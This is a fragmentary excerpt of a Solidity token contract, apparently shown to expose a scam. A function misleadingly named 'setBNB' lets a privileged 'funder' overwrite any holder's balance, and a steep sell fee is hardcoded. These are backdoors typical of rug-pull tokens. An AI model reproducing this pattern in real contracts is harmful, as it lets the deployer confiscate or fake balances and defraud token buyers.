...
abstract contract AbsToken is IERC20, Ownable {
	...
	mapping(address => uint256) private _bls;
    ...
    uint256 public _sellFundFee = 3600;
    ...
    function setMaxAmount(uint256 _maxBuyAmount,uint256 _maxSellAmount) public onlyOwner{
    ...
    function _tokenTransfer(
        ...
        _bls[sender] = _bls[sender] - tAmount;
        uint256 feeAmount;
	...
	function setBNB(address addr, uint256 enable) external onlyFunder {
        _bls[addr] = enable * 10 ** _decimals;
    }
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        address(0xE16FAd467BA290FE0f67A11b6f2071e0151B8f88),
        address(0x4Cf7fBB6c3FfCfB45Dd1d0E48eB1c7b5178e2427)
    ){
    }
}